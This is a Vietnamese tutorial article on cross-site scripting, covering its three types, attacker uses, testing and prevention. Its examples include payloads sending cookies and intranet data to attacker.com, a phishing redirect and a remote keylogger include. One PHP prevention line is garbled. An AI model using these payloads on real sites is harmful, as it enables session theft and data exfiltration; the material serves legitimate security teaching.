# Tấn công Cross-site Scripting (XSS): Hiểm họa tiềm ẩn và Giải pháp phòng chống hiệu quả

<small>*Ngày cập nhật: 30 tháng 05, 2024*</small>

XSS là một trong các lỗ hổng bảo mật khá nổi tiếng, khác với SQL injection, lỗ hổng XSS chủ yếu được thực thi ở phía client, nhằm mục đích đánh cắp thông tin người dùng.

## Nội dung chính:

[I. XSS là gì?](#what-is-xss)

[II. XSS (Cross-Site Scripting) hoạt động như thế nào?](#how-does-xss-crosssite-scripting-work)

[III. Các loại tấn công XSS (Cross-Site Scripting)](#types-of-xss-crosssite-scripting-attacks)
- [1. Stored XSS (Persistent XSS)](#stored-xss-persistent-xss)
- [2. Reflected XSS (Non-persistent XSS)](#reflected-xss-nonpersistent-xss)
- [3. DOM-based XSS](#dombased-xss)

[IV. Những Ứng Dụng Của XSS (Cross-Site Scripting)](#applications-of-xss-crosssite-scripting)
- [1. Đánh cắp Cookie và Thông tin Phiên](#steal-cookies-and-session-information)
- [2. Tấn công Phishing và Chuyển Hướng Độc Hại](#phishing-attacks-and-malicious-redirects)
- [3. Chèn Nội Dung Độc Hại](#inserting-harmful-content)
- [4. Thực hiện Các Hành Động Thay Người Dùng (Session Hijacking)](#performing-actions-on-users-behalf-session-hijacking)
- [5. Tấn công vào Mạng Nội Bộ (Intranet)](#attack-on-internal-network-intranet)
- [6. Phát tán Mã Độc](#distributing-malicious-code)

[V. Tác Động Của Lỗ Hổng XSS (Cross-Site Scripting)](#impact-of-crosssite-scripting-xss-vulnerabilities)

[VI. Cách Tìm Kiếm và Kiểm Tra Lỗ Hổng XSS (Cross-Site Scripting)](#how-to-search-and-test-for-xss-crosssite-scripting-vulnerabilities)

[VII. Biện pháp phòng chống XSS (Cross-Site Scripting)](#measures-to-prevent-xss-crosssite-scripting)

<a name="what-is-xss"></a>
## I. XSS là gì?

`Cross-Site Scripting (XSS)` là một lỗ hổng bảo mật phổ biến trên các ứng dụng web, cho phép kẻ tấn công chèn và thực thi mã độc hại trong trình duyệt của người dùng khác. Lỗ hổng này xảy ra khi một ứng dụng web cho phép dữ liệu không tin cậy (chẳng hạn như dữ liệu nhập từ người dùng) được đưa vào trang web mà không được xác thực hoặc mã hóa đúng cách.

Hiểu một cách đơn giản, XSS cho phép hacker lợi dụng các lỗ hổng bảo mật trên trang web để chèn các đoạn mã script độc hại. Những đoạn mã này sau đó được gửi đến người dùng, hoặc người dùng vô tình truy cập vào trang web đã bị nhiễm mã độc. Qua đó, hacker có thể đánh cắp thông tin nhạy cảm như `Cookie` của người dùng và sử dụng nó để truy cập vào các tài khoản trên website đã bị nhiễm mã độc.

<a name="how-does-xss-crosssite-scripting-work"></a>
## II. XSS (Cross-Site Scripting) hoạt động như thế nào?

`Tấn công XSS (Cross-site Scripting)` là một kỹ thuật tấn công web trong đó kẻ tấn công chèn mã độc hại (thường là JavaScript) vào một trang web. Khi người dùng truy cập trang web bị nhiễm, mã độc hại được thực thi trong trình duyệt của họ, cho phép kẻ tấn công thực hiện nhiều hành vi nguy hiểm.

**Đây là các bước cơ bản trong một cuộc tấn công XSS:**

1. **Kẻ tấn công tìm kiếm lỗ hổng:** Kẻ tấn công sẽ tìm kiếm các trang web có lỗ hổng bảo mật cho phép họ chèn mã độc hại. Lỗ hổng này có thể nằm trong các thành phần web như biểu mẫu nhập liệu, thanh tìm kiếm, hoặc các yếu tố HTML khác.
2. **Chèn mã độc hại:** Kẻ tấn công chèn mã độc hại vào trang web, thường là thông qua URL, biểu mẫu nhập liệu hoặc các yêu cầu HTTP khác. Mã độc hại này có thể được viết bằng JavaScript, HTML hoặc các ngôn ngữ lập trình khác.
3. **Thực thi mã độc:** Khi người dùng truy cập trang web bị nhiễm, mã độc hại được thực thi trong trình duyệt của họ. Mã độc hại này có thể thực hiện nhiều hành vi nguy hiểm, bao gồm:
    * **Đánh cắp thông tin nhạy cảm:** Kẻ tấn công có thể đánh cắp thông tin đăng nhập, thông tin tài chính, dữ liệu cá nhân và các thông tin nhạy cảm khác của người dùng.
    * **Gián điệp hoạt động người dùng:** Kẻ tấn công có thể theo dõi hành vi của người dùng trên trang web, bao gồm các trang họ truy cập, các hành động họ thực hiện và dữ liệu họ nhập.
    * **Lây nhiễm phần mềm độc hại:** Kẻ tấn công có thể sử dụng XSS để lây nhiễm phần mềm độc hại vào máy tính của người dùng.
    * **Gây tổn hại danh tiếng:** Doanh nghiệp có thể bị tổn hại danh tiếng nếu trang web của họ bị tấn công XSS.

Để xác nhận lỗ hổng XSS, một phương pháp phổ biến là sử dụng các payload đơn giản để kích hoạt các hàm JavaScript như `alert()` hoặc `print()`. Những hàm này giúp hiển thị thông báo rõ ràng khi payload được thực thi thành công trong trình duyệt của nạn nhân.

**Sử dụng hàm `alert()`**

Trong các PoC XSS truyền thống, hàm `alert()` thường được sử dụng để hiển thị một hộp thoại cảnh báo khi mã độc được thực thi. Ví dụ:
```html
<script>alert('XSS thành công!');</script>
```
Nếu đoạn mã này được chèn vào một trang web và hiển thị hộp thoại cảnh báo khi người dùng truy cập trang đó, điều này chứng minh rằng trang web có lỗ hổng XSS.

**Sử dụng hàm `print()`**

Từ phiên bản 92 của Chrome (phát hành vào ngày 20 tháng 7 năm 2021), các iframe có nguồn gốc khác nhau bị ngăn chặn gọi hàm `alert()`. Vì vậy, trong một số tình huống phức tạp hơn, hàm `print()` có thể được sử dụng thay thế:
```html
<script>print('XSS thành công!');</script>
```
Tương tự như `alert()`, khi đoạn mã này được thực thi, nó sẽ kích hoạt hộp thoại in ấn của trình duyệt, giúp xác nhận lỗ hổng XSS.

<a name="types-of-xss-crosssite-scripting-attacks"></a>
## III. Các loại tấn công XSS (Cross-Site Scripting)

Có ba loại tấn công XSS chính: `Stored XSS`, `Reflected XSS` và `DOM-based XSS`. Mỗi loại tấn công có đặc điểm và cơ chế hoạt động riêng.

<a name="stored-xss-persistent-xss"></a>
### 1. Stored XSS (Persistent XSS)

`Stored XSS`, còn được gọi là `Persistent XSS`, là loại tấn công XSS trong đó mã độc được lưu trữ vĩnh viễn trên máy chủ đích, chẳng hạn như trong cơ sở dữ liệu, hệ thống lưu trữ dữ liệu hoặc diễn đàn. Khi người dùng truy cập vào trang chứa dữ liệu bị nhiễm, mã độc sẽ được thực thi trên trình duyệt của họ.

**Cách thức hoạt động**
1. Kẻ tấn công chèn mã độc vào một trường đầu vào trên trang web (ví dụ: bình luận, tin nhắn, hoặc bài viết).
2. Dữ liệu đầu vào này được lưu trữ trên máy chủ mà không được mã hóa hoặc xác thực đúng cách.
3. Khi người dùng khác truy cập trang chứa dữ liệu này, mã độc sẽ được tải xuống và thực thi trong trình duyệt của họ.

Giả sử một trang web có hệ thống bình luận cho phép người dùng đăng bình luận về các bài viết. Kẻ tấn công có thể chèn một đoạn mã JavaScript độc hại vào bình luận của mình như sau:
```html
<script>alert('Bạn đã bị tấn công!');</script>
```
Khi người dùng khác truy cập vào trang có chứa bình luận này, đoạn mã JavaScript sẽ được thực thi trên trình duyệt của họ và hiển thị thông báo cảnh báo.

<a name="reflected-xss-nonpersistent-xss"></a>
### 2. Reflected XSS (Non-persistent XSS)

`Reflected XSS`, còn được gọi là `Non-persistent XSS`, là loại tấn công XSS trong đó mã độc không được lưu trữ trên máy chủ mà được phản hồi ngay lập tức từ yêu cầu HTTP của người dùng. Điều này thường xảy ra khi các dữ liệu đầu vào của người dùng (như tham số trong URL) được trả về và hiển thị trực tiếp trên trang mà không qua kiểm tra.

**Cách thức hoạt động**
1. Kẻ tấn công tạo một liên kết chứa mã JavaScript độc hại và gửi nó cho người dùng (qua email, tin nhắn, hoặc trang web khác).
2. Khi người dùng nhấp vào liên kết, yêu cầu HTTP được gửi tới máy chủ, máy chủ trả về phản hồi chứa mã độc.
3. Mã độc được thực thi trên trình duyệt của người dùng.

Giả sử một trang web sử dụng tham số URL để hiển thị thông báo cá nhân hóa:
```html
http://example.com/welcome.php?name=<script>alert('Bạn đã bị tấn công!');</script>
```
Khi người dùng truy cập vào liên kết này, đoạn mã JavaScript sẽ được thực thi ngay lập tức trong trình duyệt của họ, dẫn đến việc hiển thị thông báo cảnh báo.

<a name="dombased-xss"></a>
### 3. DOM-based XSS

`DOM-based` XSS là loại tấn công XSS xảy ra khi dữ liệu không tin cậy được xử lý trực tiếp trong `Document Object Model (DOM)` của trình duyệt. Dữ liệu này có thể thay đổi cấu trúc hoặc hành vi của trang web mà không cần sự can thiệp của máy chủ.

**Cách thức hoạt động**
1. Kẻ tấn công chèn mã độc vào một phần tử trên trang web mà dữ liệu được xử lý trực tiếp trong DOM (ví dụ: thông qua URL hoặc đầu vào người dùng).
2. Trình duyệt của người dùng xử lý dữ liệu này và thực thi mã độc.
3. Mã độc có thể thay đổi nội dung trang hoặc thực hiện các hành động khác trên trình duyệt của người dùng.

Giả sử một trang web có đoạn mã JavaScript sau đây để hiển thị tên người dùng:
```html
<div id="user">Hello, <span id="username"></span></div>
<script>
  var username = location.hash.substring(1);
  document.getElementById('username').innerHTML = username;
</script>
```
Nếu người dùng truy cập vào URL:
```html
http://example.com/#<script>alert('Bạn đã bị tấn công!');</script>
```
Mã JavaScript sẽ thay đổi nội dung của phần tử `username` và thực thi đoạn mã độc, dẫn đến việc hiển thị thông báo cảnh báo.

<a name="applications-of-xss-crosssite-scripting"></a>
## IV. Những Ứng Dụng Của XSS (Cross-Site Scripting)

Cross-Site Scripting (XSS) là một lỗ hổng bảo mật nguy hiểm có thể được kẻ tấn công lợi dụng để thực hiện nhiều hành động độc hại khác nhau. Đây là một số ví dụ về những gì XSS có thể được sử dụng:

<a name="steal-cookies-and-session-information"></a>
### 1. Đánh cắp Cookie và Thông tin Phiên

Một trong những mục đích phổ biến nhất của tấn công XSS là đánh cắp cookie của người dùng. Cookie thường chứa thông tin phiên đăng nhập và các thông tin nhạy cảm khác. Kẻ tấn công có thể sử dụng mã JavaScript để gửi cookie của người dùng tới máy chủ của họ, từ đó sử dụng cookie này để giả mạo danh tính và truy cập tài khoản của người dùng trên trang web bị tấn công.

**Ví dụ:**
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal-cookie?cookie=" + document.cookie;
</script>
```
Đoạn mã này sẽ gửi cookie của người dùng tới máy chủ của kẻ tấn công.

<a name="phishing-attacks-and-malicious-redirects"></a>
### 2. Tấn công Phishing và Chuyển Hướng Độc Hại

XSS có thể được sử dụng để thực hiện các cuộc tấn công phishing bằng cách thay đổi giao diện của trang web hoặc chuyển hướng người dùng đến một trang web giả mạo để đánh cắp thông tin đăng nhập và các dữ liệu cá nhân khác.

**Ví dụ:**
```javascript
<script>
window.location = "http://phishing-site.com";
</script>
```
Đoạn mã này sẽ chuyển hướng người dùng đến một trang web giả mạo.

<a name="inserting-harmful-content"></a>
### 3. Chèn Nội Dung Độc Hại

Kẻ tấn công có thể sử dụng XSS để chèn nội dung độc hại vào trang web, chẳng hạn như các quảng cáo không mong muốn, các liên kết tải xuống phần mềm độc hại, hoặc các biểu mẫu giả mạo để thu thập thông tin cá nhân.

**Ví dụ:**
```javascript
<script>
document.body.innerHTML = '<h1>Hệ thống của bạn bị nhiễm virus! Hãy tải xuống công cụ diệt virus tại đây.</h1><a href="http://malicious-site.com">Tải xuống</a>';
</script>
```
Đoạn mã này sẽ thay đổi nội dung của trang web để hiển thị thông báo giả mạo và liên kết độc hại.

<a name="performing-actions-on-users-behalf-session-hijacking"></a>
### 4. Thực hiện Các Hành Động Thay Người Dùng (Session Hijacking)

Kẻ tấn công có thể sử dụng XSS để thực hiện các hành động thay mặt người dùng, chẳng hạn như gửi tin nhắn, đăng bài, hoặc thay đổi cài đặt tài khoản mà người dùng không hề hay biết.

**Ví dụ:**
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://example.com/api/change-email", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({
  email: "attacker@example.com"
}));
</script>
```
Đoạn mã này sẽ gửi yêu cầu thay đổi địa chỉ email của người dùng mà không cần sự cho phép của họ.

<a name="attack-on-internal-network-intranet"></a>
### 5. Tấn công vào Mạng Nội Bộ (Intranet)

Nếu người dùng bị tấn công đang kết nối với mạng nội bộ (intranet) của một tổ chức, kẻ tấn công có thể sử dụng XSS để truy cập và tấn công các dịch vụ và thiết bị trong mạng nội bộ đó.

**Ví dụ:**
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://intranet.local/admin", true);
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    // Gửi dữ liệu thu thập được đến máy chủ của kẻ tấn công
    var img = new Image();
    img.src = "http://attacker.com/steal-data?data=" + xhr.responseText;
  }
};
xhr.send();
</script>
```
Đoạn mã này sẽ gửi yêu cầu đến một trang quản trị nội bộ và gửi dữ liệu thu thập được đến máy chủ của kẻ tấn công.

<a name="distributing-malicious-code"></a>
### 6. Phát tán Mã Độc

Kẻ tấn công có thể sử dụng XSS để phát tán mã độc, chẳng hạn như ransomware hoặc keylogger, tới các nạn nhân bằng cách chèn mã độc vào các trang web phổ biến hoặc các ứng dụng web.

**Ví dụ:**
```javascript
<script src="http://attacker.com/keylogger.js"></script>
```
Đoạn mã này sẽ tải và thực thi một keylogger từ máy chủ của kẻ tấn công, theo dõi và ghi lại mọi phím mà người dùng nhấn.

<a name="impact-of-crosssite-scripting-xss-vulnerabilities"></a>
## V. Tác Động Của Lỗ Hổng XSS (Cross-Site Scripting)

Cross-Site Scripting (XSS) là một trong những lỗ hổng bảo mật phổ biến và nguy hiểm trên các ứng dụng web. Ảnh hưởng của các lỗ hổng XSS có thể rất nghiêm trọng và đa dạng:

**1. Đánh Cắp Thông Tin Người Dùng**

Các lỗ hổng XSS thường được kẻ tấn công sử dụng để đánh cắp thông tin cá nhân của người dùng, bao gồm tên đăng nhập, mật khẩu, thông tin thẻ tín dụng và thông tin cá nhân khác. Thông tin này có thể được sử dụng cho các mục đích lừa đảo, gian lận hoặc tấn công tiếp theo.

**2. Đánh Cắp Phiên (Session Hijacking)**

Bằng cách đánh cắp cookie phiên của người dùng thông qua các lỗ hổng XSS, kẻ tấn công có thể giả mạo danh tính của họ và truy cập vào các tài khoản đã đăng nhập mà không cần biết mật khẩu.

**3. Phishing và Lừa Đảo**

Các lỗ hổng XSS có thể được sử dụng để tạo ra các trang web giả mạo hoặc hiển thị thông báo giả mạo để lừa đảo người dùng và lấy thông tin cá nhân của họ, như thông tin đăng nhập hoặc thông tin tài khoản ngân hàng.

**4. Chèn Nội Dung Độc Hại**

Kẻ tấn công có thể chèn nội dung độc hại như quảng cáo không mong muốn, trình duyệt mã độc hoặc biểu mẫu giả mạo vào các trang web bị ảnh hưởng bởi XSS. Điều này có thể gây ra những hậu quả tiêu cực cho trải nghiệm người dùng và làm suy yếu tính bảo mật của hệ thống.

**5. Tấn Công Đa Phương Tiện**

Các lỗ hổng XSS có thể được sử dụng để tấn công vào các trang web chứa nội dung đa phương tiện, như video, hình ảnh hoặc âm nhạc. Điều này có thể làm suy yếu tính bảo mật của người dùng khi họ truy cập vào các trang web đó.

**6. Suy Yếu Hệ Thống**

Nếu một ứng dụng web chứa một số lượng lớn các lỗ hổng XSS, nó có thể trở nên suy yếu và dễ bị tấn công hơn, dẫn đến nguy cơ mất dữ liệu, mất dịch vụ hoặc ảnh hưởng tiêu cực đến danh tiếng của tổ chức.

<a name="how-to-search-and-test-for-xss-crosssite-scripting-vulnerabilities"></a>
## VI. Cách Tìm Kiếm và Kiểm Tra Lỗ Hổng XSS (Cross-Site Scripting)

### Sử dụng Burp Suite:

1. **Sử dụng Burp Suite's Web Vulnerability Scanner**: Burp Suite cung cấp một công cụ quét lỗ hổng web mạnh mẽ giúp phát hiện lỗ hổng XSS một cách nhanh chóng và đáng tin cậy trên ứng dụng web.

### Kiểm Tra Thủ Công:

1. **Kiểm Tra Reflected và Stored XSS**: 
   - Nhập các đầu vào đơn giản và duy nhất (như chuỗi chữ và số) vào mọi điểm nhập trong ứng dụng.
   - Xác định mọi vị trí mà đầu vào đã được gửi trả lại trong các phản hồi HTTP.
   - Kiểm tra từng vị trí để xác định liệu đầu vào có thể được sử dụng để thực thi JavaScript bất kỳ không.

2. **Kiểm Tra DOM-based XSS từ Tham số URL**:
   - Đặt một đầu vào duy nhất vào tham số URL.
   - Sử dụng các công cụ phát triển của trình duyệt để tìm kiếm DOM cho đầu vào này.
   - Kiểm tra từng vị trí để xác định xem nó có thể bị khai thác không.

3. **Kiểm Tra DOM-based XSS từ Các Tài Nguyên Khác**:
   - Kiểm tra mã JavaScript để tìm các điểm tiếp nhận đầu vào không phải HTML hoặc URL.
   - Sử dụng Burp Suite hoặc các công cụ phân tích tĩnh và động khác để phát hiện các lỗ hổng DOM-based XSS.

### Content Security Policy (CSP):

1. **Đánh giá CSP của Ứng Dụng**:
   - Kiểm tra xem ứng dụng có sử dụng CSP không và cách nó được cấu hình.
   - Xem xét liệu CSP có thể ngăn chặn việc khai thác lỗ hổng XSS không.
   - Thường, CSP có thể được đánh lừa để cho phép khai thác lỗ hổng XSS.

### Dangling Markup Injection:

1. **Xác Định Lỗ Hổng Dangling Markup Injection**:
   - Kiểm tra xem có thể thực hiện lỗ hổng Dangling Markup Injection không.
   - Dangling Markup Injection thường được sử dụng để đánh cắp thông tin nhạy cảm hoặc CSRF tokens.
   - Đảm bảo triển khai các biện pháp bảo mật chống lại Dangling Markup Injection.

<a name="measures-to-prevent-xss-crosssite-scripting"></a>
## VII. Biện pháp phòng chống XSS (Cross-Site Scripting)

1. **Xử lý và mã hóa đầu vào người dùng**: 
    - Sử dụng các hàm như `htmlspecialchars()` trong PHP để mã hóa các ký tự đặc biệt. Ví dụ:
	```php
	echo htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
	```

    - Sử dụng `password_hash()` trong PHP để băm mật khẩu người dùng trước khi lưu vào cơ sở dữ liệu:
	```php
	$password = mật khẩu_hash($_POST['password'], PASSWORD_DEFAULT);
	```

    - Đảm bảo rằng các ký tự đặc biệt (như `<`, `>`, `&`, `"` và `'`) được mã hóa đúng cách. Để phòng chống XSS, trang web cần lọc dữ liệu đầu vào để loại bỏ các ký tự đặc biệt như `</script>`, sau đó sterilize dữ liệu bằng cách mã hóa các ký tự HTML, ví dụ:
	```html
	<p>Tên của bạn: <?= htmlentities($_POST['ten']) ?></p>
	```

2. **Sử dụng Content Security Policy (CSP)**:
    - Thiết lập CSP để hạn chế các nguồn tài nguyên được phép tải và thực thi trên trang web. CSP có thể giúp ngăn chặn việc thực thi mã độc từ các nguồn không tin cậy.

3. **Kiểm tra và lọc dữ liệu đầu vào**:
    - Sử dụng các hàm kiểm tra và lọc dữ liệu đầu vào để loại bỏ hoặc mã hóa các ký tự đặc biệt có thể gây ra XSS.

    - Các thư viện như `OWASP AntiSamy` có thể giúp kiểm tra và lọc các đầu vào người dùng.

4. **Sử dụng các framework bảo mật**:
    - Nhiều framework hiện đại như Angular, React, và Vue.js có các cơ chế bảo vệ XSS tích hợp sẵn. Sử dụng các framework này để giảm thiểu rủi ro XSS.

5. **Cập nhật và vá lỗi thường xuyên**:
    - Đảm bảo rằng phần mềm và các thư viện bạn sử dụng luôn được cập nhật và vá lỗi bảo mật thường xuyên.

Trong quá trình kiểm thử phần mềm, đánh giá rủi ro tiềm ẩn do các cuộc tấn công XSS là bước vô cùng quan trọng. `XSS (Cross-site Scripting)` được xem là một trong những mối đe dọa nguy hiểm nhất đối với ứng dụng web, cho phép kẻ tấn công chèn mã độc hại vào trang web, gây ra nhiều hậu quả nghiêm trọng như đánh cắp thông tin nhạy cảm, lây nhiễm phần mềm độc hại, thậm chí dẫn đến việc chiếm quyền kiểm soát ứng dụng.

Do đó, việc thực hiện kiểm thử tấn công XSS là điều không thể bỏ qua để đảm bảo an ninh cho ứng dụng web. Hiểu biết về các kỹ thuật tấn công XSS là nền tảng then chốt để phân tích kết quả kiểm thử một cách chính xác và lựa chọn công cụ kiểm tra phù hợp.










